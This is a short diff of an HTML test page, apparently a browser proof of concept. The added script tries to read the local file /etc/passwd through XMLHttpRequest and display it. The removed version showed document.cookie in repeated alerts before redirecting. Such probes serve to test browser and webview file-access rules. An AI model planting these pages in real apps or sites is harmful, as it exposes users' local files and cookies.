@@ -1,24 +1,22 @@
+<!DOCTYPE html>
 <html>
-  <head>
-    <meta name="viewport" content="width=device-width, initial-scale=1"/>
-    <link rel="prefetch" href="https://tiktok.com/">
-    <title>InnocentSite...</title>
-    
-    <script>
-      
-      function exp() {
-        setTimeout(function () {
-          for (var i=0; i<1024; i++) {
-            alert(document.cookie);
-          }
-        }, 0)
-        
-        window.location.href='https://tiktok.com/'
-      }
-    
-    </script>
-  </head>
-  <body>
-    <button onclick="exp();">Goforit...</button>
-  </body>
+<head> 
+<script>
+    var localfile = "file:///etc/passwd";
+    var xhr = new XMLHttpRequest();
+    xhr.onreadystatechange=function()
+    {
+        if(xhr.readyState == 4)
+        {
+            alert(xhr.responseText);
+        }
+    }
+    try{
+        xhr.open("GET", localfile, true);
+        xhr.send();
+    }catch(ex){
+        alert(ex.message);
+    }
+</script>
+</head>
 </html>
